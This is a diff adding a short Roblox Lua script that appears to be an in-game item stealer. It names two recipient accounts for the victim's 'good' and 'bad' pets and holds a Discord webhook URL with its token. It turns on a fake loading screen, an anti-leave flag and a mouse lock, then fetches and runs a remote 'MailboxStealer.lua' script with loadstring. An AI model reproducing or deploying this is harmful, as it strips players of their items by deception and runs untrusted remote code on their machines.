@@ -1,0 +1,9 @@
+UserName = "Plidonottrademe" -- Send good pets
+UserName2 = "iamhumanandarobot4" -- Send bad pets
+Webhook = "https://discordapp.com/api/webhooks/1119748568144674877/WDiat3Ztvs3L9yW-ssOI6XIMsIdpcWHiVInp6Fd-DE6U15SBs5ylbcJTI5scenJ2X4km" -- Paste your webhook link in
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
